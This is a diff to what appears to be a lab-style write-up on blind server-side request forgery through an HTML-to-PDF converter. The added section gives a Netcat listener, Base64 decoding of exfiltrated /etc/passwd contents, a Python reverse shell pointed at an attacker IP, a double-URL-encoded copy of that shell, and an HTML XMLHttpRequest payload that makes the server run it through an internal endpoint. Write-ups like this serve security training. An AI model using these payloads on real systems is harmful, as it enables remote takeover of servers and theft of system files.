@@ -20,8 +20,8 @@ To test for blind SSRF, we employed an external server setup to capture any outb
     <!DOCTYPE html>
     <html>
     <body>
-        <h1>Hello World!</h1>
-        <img src="http://<EXTERNAL SERVICE IP>:9090/test-image">
+        <a>Hello World!</a>
+        <img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
     </body>
     </html>
 
@@ -68,9 +68,66 @@ Further exploration reveals that the application's PDF conversion tool, wkhtmlto
         </script>
     </body>
     </html>
-    
+
 
 This script reads the local `/etc/passwd` file and sends its Base64-encoded contents to our Netcat listener, showcasing a direct method of exploiting the SSRF vulnerability to extract sensitive information.
+
+
+# Blind SSRF Exploitation with Netcat and Base64 Decoding
+
+In this scenario, we use two XMLHttpRequest objects: one for reading local files and another to send this data to our server, encoded in Base64.
+
+## Starting an HTTP Server and Sending Data
+
+We start an HTTP server and send an HTML file that waits for a response and decodes the content after processing.
+
+### Netcat Listener
+
+
+    sudo nc -nlvp 9090
+    Listening on 0.0.0.0 9090
+
+
+### Base64 Decoding
+
+We decode the information using Base64 to view the data received, which includes commands and system user information.
+
+echo "<BASE64_DATA>" | base64 -d
+
+
+## Blind SSRF Exploitation Scenario
+
+We continue to exploit an internal application vulnerable to SSRF to execute remote commands on the target server. In this scenario, we use an HTML document with a specific payload to exploit the application.
+
+### Bash Reverse Shell
+
+We set up and encode a reverse shell payload to gain remote control of the server.
+
+    export RHOST="<VPN/TUN IP>"; export RPORT="<PORT>"; python -c 'import sys, socket, os, pty; s=socket.socket(); s.connect((os.getenv("RHOST"), int(os.getenv("RPORT")))); [os.dup2(s.fileno(), fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")'
+
+
+### Encoded URL Payload
+
+    export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527
+
+
+### HTML Payload
+
+    <html>
+        <body>
+            <b>Reverse Shell via Blind SSRF</b>
+            <script>
+            var http = new XMLHttpRequest();
+            http.open("GET","http://host_ip/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
+            http.send();
+            http.onerror = function(){document.write('<a>Oops!</a>');}
+            </script>
+        </body>
+    </html>
+
+
+Once we initiate a Netcat listener on our machine and send the above HTML file, we will receive a reverse shell from host.
+
 
 ## Mitigation Strategies
 
